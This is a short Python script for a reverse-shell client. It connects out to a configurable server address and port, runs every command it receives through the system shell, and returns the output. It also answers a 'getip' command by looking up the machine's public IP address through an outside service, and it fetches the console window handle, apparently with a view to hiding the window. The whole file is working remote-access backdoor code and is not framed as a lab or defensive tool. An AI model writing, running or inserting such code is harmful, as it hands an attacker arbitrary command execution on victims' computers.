import socket
import subprocess
import requests
import ctypes


user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
hwnd = kernel32.GetConsoleWindow()


def start_client(server_ip, server_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, server_port))

    while True:
        command = client.recv(1024).decode()
        print(f"[Received Command] {command}")


        if command.lower() == "exit":
            break

        if command.lower() == "getip":
            r = requests.get('https://api64.ipify.org?format=json')
            response = r.json()
            output = response['ip']
            client.send(output.encode())
            continue

        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        except subprocess.CalledProcessError as e:
            output = e.output

        client.send(output.encode())

    client.close()

if __name__ == "__main__":
    SERVER_IP = "127.0.0.1"  # Change this if needed
    SERVER_PORT = 5555 #change port if needed
    start_client(SERVER_IP, SERVER_PORT)